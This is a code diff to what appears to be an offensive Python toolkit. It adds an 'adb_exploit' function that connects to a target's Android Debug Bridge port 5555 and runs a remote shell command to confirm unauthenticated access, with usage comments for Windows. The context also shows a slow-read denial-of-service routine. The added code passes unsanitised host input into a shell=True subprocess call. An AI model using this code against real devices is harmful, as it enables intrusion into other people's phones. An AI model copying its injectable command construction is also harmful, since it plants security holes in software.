@@ -1,3 +1,5 @@
+#coding: utf-8
+import subprocess,os
 import requests,socket,random,time,ssl
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -869,3 +871,25 @@ def slow_read_test(u,port=80,logs=True,timeout=5,duration=180,returning=False,ra
    print("==>connection closed at: {} seconds".format(int(time.time()-ti)))
   if returning==True:
    return int(time.time()-ti)
+def adb_exploit(u,port=5555,adb_path="adb"):
+ #if you are on linux, you can skip those comments ;)
+ #if you are on windows, you should set the "adb_path" with the full currect path to "adb.exe" and replace "\" with "\\" and delete ".exe" 
+
+ #for example, i have the binaries on this location:
+    
+ #C:\Users\user\Desktop\adb\adb.exe
+
+ #so i do this:
+    
+ #bane.adb_exploit('XXX.XXX.XXX.XXX',adb_path="C:\\Users\\user\\Desktop\\adb\\adb")
+
+ try:
+  #https://stackoverflow.com/questions/14654718/how-to-use-adb-shell-when-multiple-devices-are-connected-fails-with-error-mor
+  a="{} connect {}:{} && {} -s {}:{} shell echo ala_is_king && {} disconnect {}:{}".format(adb_path,u,port,adb_path,u,port,adb_path,u,port)
+  d = subprocess.Popen(a,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+  r=d.communicate()
+  if 'ala_is_king' in str(r[0]):
+     return True
+ except Exception as e:
+  pass
+ return False
